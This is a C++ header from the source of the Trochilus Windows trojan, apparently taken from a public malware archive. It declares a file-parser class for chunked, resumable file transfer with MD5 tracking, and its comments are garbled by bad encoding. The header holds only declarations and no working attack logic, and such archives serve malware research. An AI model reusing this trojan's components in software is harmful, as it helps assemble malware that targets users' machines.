/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "encrypt/encrypt.h"
#include "file/MyFile.h"

#define OPTIONS_EXT _T(".cfg")

#define MAX_BLOCK_SIZE 1024*32

//�ϵ㴫�������ļ�
typedef struct
{
	char szMD5[255];
	char szFileName[255];
	int nTotalSize;
	int nCurSel;
}FILE_OPTIONS,*PFILE_OPTIONS;

#define OPTIONS_SIZE sizeof(FILE_OPTIONS)

class CFileParser
{
	DECLARE_SINGLETON(CFileParser)

public:

	//д���ļ���
	BOOL Write(LPCTSTR filepath,int nSize,std::wstring MD5,ByteBuffer& buffer);
	
	//��ȡ�ļ���
	int Read(LPCTSTR filepath,int nOffset,int nSize,std::wstring& MD5 ,ByteBuffer& buffer);

	//�ж��ļ��Ƿ������
	BOOL IsFileFinish(LPCTSTR filepath);

	//�õ���ǰ����״̬
	BOOL GetFileCurStatus(LPCTSTR filepath,FILE_OPTIONS& options);

	//�õ��ļ�����
	int GetFileContent(LPCTSTR filepath,INT64 nPos,int nSize ,ByteBuffer& buffer);

	//д���ļ�����
	BOOL PutFilecContent(LPCTSTR filepath,int nSize ,ByteBuffer& buffer);

	//���µ�ǰ�ļ�����״̬
	BOOL UpdateFileStatus(LPCTSTR filepath,FILE_OPTIONS& options);

	//������ʱ�ļ�
	BOOL CreateFileStatus(LPCTSTR filepath,LPCTSTR md5,int nTotal);

	//�ж��ļ��Ƿ����
	BOOL IsFileExist(LPCTSTR filepath);
};

